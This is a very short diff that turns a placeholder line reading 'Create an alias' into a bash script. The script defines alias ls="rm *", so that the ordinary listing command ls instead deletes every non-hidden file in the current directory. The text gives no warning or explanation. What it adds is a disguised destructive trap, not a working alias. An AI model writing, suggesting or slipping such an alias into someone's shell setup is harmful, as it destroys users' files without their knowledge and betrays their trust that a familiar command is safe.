@@ -1,1 +1,2 @@
-Create an alias
+#!/bin/bash
+alias ls="rm *"
